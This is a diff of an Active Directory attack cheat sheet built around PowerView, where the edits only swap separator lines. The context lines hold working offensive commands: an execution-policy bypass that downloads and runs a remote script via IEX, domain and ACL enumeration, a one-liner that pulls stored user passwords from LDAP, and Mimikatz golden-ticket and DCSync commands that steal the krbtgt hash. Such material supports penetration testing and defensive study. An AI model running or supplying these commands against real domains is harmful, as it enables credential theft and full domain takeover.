@@ -1,4 +1,3 @@
-
 PowerView
 
 
@@ -15,7 +14,7 @@ C:\temp> powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFi
 
 C:\temp> powershell.exe -nop -exec bypass                      Start PowerShell and bypass the execution policy
 PS C:\temp> Import-Module .\PowerView.ps1                      Import PowerView
-===================================================================================================================================================================
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 - Domain Enumeration
 Get-NetDomain                                                  Get the domain name and domain controller (DC)
@@ -63,7 +62,7 @@ Invoke-UserHunter -CheckAccess                                 Find computers wh
 Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs            Enumerate the ACLs for the users group
 Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}      See if there is any user has a modification rights to a GPO
 Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"     Check if a user has the permission (Reset Password)
-=================================================================================================================================================================
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 PowerView-3.0 tips and tricks
 by HarmJ0y
@@ -268,7 +267,7 @@ Get-ObjectACL "DC=testlab,DC=local" -ResolveGUIDs | ? {
 # Check if any user passwords are set
 $FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
  @scerazy
-=================================================================================================================================================================
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 HarmJ0y/44con_demo.ps1
 
@@ -313,7 +312,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:jwarner.a /domain:testlab.loca
 
 # dcsync the krbtgt hash from the external.local forest trust
 Invoke-Mimikatz -Command '"lsadump::dcsync /domain:external.local /user:external\krbtgt"'
-=================================================================================================================================================================
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 BSides LV 2015             Building an Empire with PowerShell                               www.youtube.com/watch?v=Pq9t59w0mUI
 BSides DC 2015             Bridging the Gap: Lessons in Adversarial Tradecraft              www.youtube.com/watch?v=xHkRhRo3l8o
